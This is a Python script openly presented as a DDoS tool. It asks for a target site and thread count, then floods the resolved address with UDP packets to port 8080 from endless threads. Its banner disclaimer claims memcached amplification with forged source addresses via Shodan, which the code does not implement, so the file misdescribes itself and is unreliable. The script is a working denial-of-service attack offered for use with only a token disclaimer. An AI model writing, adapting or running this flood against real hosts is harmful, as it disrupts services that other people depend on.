#Mehraan kiya
#python project

#Required libraries
import time
import socket
import sys
import _thread

print("""

DDOS SCRIPT                     VERSION 1.0

CODED BY                        *m3hr44n*

                  https://github.com/m3hr44n
  


  ####################################### DISCLAIMER ########################################
| ddos-script is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                          author:m3hr44n

                                          version:1.0





""")





#To get input from the user

site = input("Enter your site url ==> : ")

thread_count = input("Enter your thread ==> : ")

ip = socket.gethostbyname(site)

UDP_PORT = 8080

MESSAGE = "Roshanamooz.ir"


print("UDP target IP:", ip)


print("UDP target port:", UDP_PORT)


time.sleep(3)

def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))

        print("Packet Sent")

for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)

while 1:
  pass